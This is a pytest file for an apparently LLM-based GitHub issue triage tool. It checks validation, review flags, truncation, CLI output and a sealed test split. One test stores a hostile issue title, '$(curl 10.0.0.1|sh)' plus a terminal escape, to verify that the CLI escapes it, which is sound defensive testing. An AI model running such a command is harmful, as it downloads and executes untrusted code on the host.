"""Tests for src/triage. None of them call a real model.

No __init__.py in this directory on purpose: it would make this folder a
package named `triage` and shadow src/triage.
"""

from __future__ import annotations

import json
from collections.abc import Mapping, Sequence
from pathlib import Path

import pytest

from triage.cli import load_split, main
from triage.extract import scripted_predictor
from triage.schema import Issue
from triage.triage import MAX_BODY_CHARS, triage_issue

GOOD_ANSWER: dict[str, object] = {
    "issue_type": "bug",
    "component": "Middleware",
    "severity": "high",
    "has_reproduction_steps": True,
    "summary": "CORS middleware   overwrites the Vary header.",
    "confidence": 0.92,
}


class FakePredictor:
    """Returns a fixed answer and records what it was shown."""

    def __init__(self, answer: Mapping[str, object] | Exception) -> None:
        self.answer = answer
        self.seen: list[tuple[Issue, tuple[str, ...]]] = []

    def __call__(self, issue: Issue, allowed: Sequence[str]) -> Mapping[str, object]:
        self.seen.append((issue, tuple(allowed)))
        if isinstance(self.answer, Exception):
            raise self.answer
        return self.answer


def hono_issue(**overrides: object) -> Issue:
    fields: dict[str, object] = {"repo": "hono", "number": 4471, "title": "Vary header overwritten", "body": "steps..."}
    return Issue.model_validate(fields | overrides)


def test_valid_answer_becomes_ok_record() -> None:
    record = triage_issue(hono_issue(), FakePredictor(GOOD_ANSWER), model="fake/model")

    assert record.status == "ok"
    assert record.issue_type == "bug"
    assert record.component == "middleware"  # matched to the repo taxonomy's spelling
    assert record.severity == "high"
    assert record.summary == "CORS middleware overwrites the Vary header."
    assert record.needs_human_review is False
    assert record.model == "fake/model"


def test_component_outside_repo_taxonomy_is_dropped() -> None:
    # textual has no component taxonomy, so any component the model names is invented.
    record = triage_issue(hono_issue(repo="textual"), FakePredictor(GOOD_ANSWER))

    assert record.status == "ok"
    assert record.component is None


def test_invalid_issue_type_gives_error_record() -> None:
    record = triage_issue(hono_issue(), FakePredictor(GOOD_ANSWER | {"issue_type": "urgent"}))

    assert record.status == "error"
    assert record.issue_type is None
    assert record.needs_human_review is True
    assert record.error is not None and "issue_type" in record.error


def test_model_failure_gives_error_record_instead_of_raising() -> None:
    record = triage_issue(hono_issue(), FakePredictor(TimeoutError("provider timed out")))

    assert record.status == "error"
    assert record.confidence == 0.0
    assert record.error == "TimeoutError: provider timed out"


@pytest.mark.parametrize(("confidence", "issue_type", "review"), [(0.5, "bug", True), (0.9, "other", True), (1.7, "bug", False)])
def test_needs_human_review(confidence: float, issue_type: str, review: bool) -> None:
    answer = GOOD_ANSWER | {"confidence": confidence, "issue_type": issue_type}
    record = triage_issue(hono_issue(), FakePredictor(answer))

    assert record.needs_human_review is review
    assert 0.0 <= record.confidence <= 1.0


def test_model_sees_no_labels_and_a_truncated_body() -> None:
    raw = {"repo": "hono", "number": 1, "title": "t", "body": "x" * (MAX_BODY_CHARS + 500), "labels": ["bug"], "gold_type": "bug"}
    fake = FakePredictor(GOOD_ANSWER)
    triage_issue(Issue.model_validate(raw), fake)

    shown, allowed = fake.seen[0]
    assert "labels" not in shown.model_dump()
    assert shown.body is not None and shown.body.endswith("[truncated]")
    assert len(shown.body) < MAX_BODY_CHARS + 20
    assert allowed == ("middleware", "testing")


def test_dspy_signature_parses_a_model_reply() -> None:
    predict = scripted_predictor(
        [
            {
                "issue_type": "enhancement",
                "component": "none",
                "severity": "low",
                "has_reproduction_steps": "False",
                "summary": "Asks for a fixed footer row in DataTable.",
                "confidence": "0.8",
            }
        ]
    )
    record = triage_issue(hono_issue(repo="textual"), predict)

    assert record.status == "ok", record.error
    assert record.issue_type == "enhancement"
    assert record.component is None
    assert record.has_reproduction_steps is False
    assert record.confidence == pytest.approx(0.8)


def test_cli_prints_record_for_dev_issue(capsys: pytest.CaptureFixture[str]) -> None:
    code = main(["--split", "dev", "--repo", "hono", "--number", "3891"], predict=FakePredictor(GOOD_ANSWER))

    out = json.loads(capsys.readouterr().out)
    assert code == 0
    assert (out["repo"], out["number"], out["status"]) == ("hono", 3891, "ok")


def test_cli_escapes_hostile_title(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    hostile = {"repo": "hono", "number": 9, "title": "$(curl 10.0.0.1|sh) \x1b[2J\U0001f528", "body": None}
    path = tmp_path / "issue.json"
    path.write_text(json.dumps(hostile), encoding="utf-8")

    code = main([str(path)], predict=FakePredictor(GOOD_ANSWER))

    out = capsys.readouterr().out
    assert code == 0
    assert out.isascii() and "\x1b" not in out
    assert json.loads(out)["title"] == hostile["title"]  # carried through as data, unchanged


def test_test_split_is_sealed() -> None:
    with pytest.raises(ValueError, match="not readable"):
        load_split("test")
    with pytest.raises(SystemExit):
        main(["--split", "test"], predict=FakePredictor(GOOD_ANSWER))
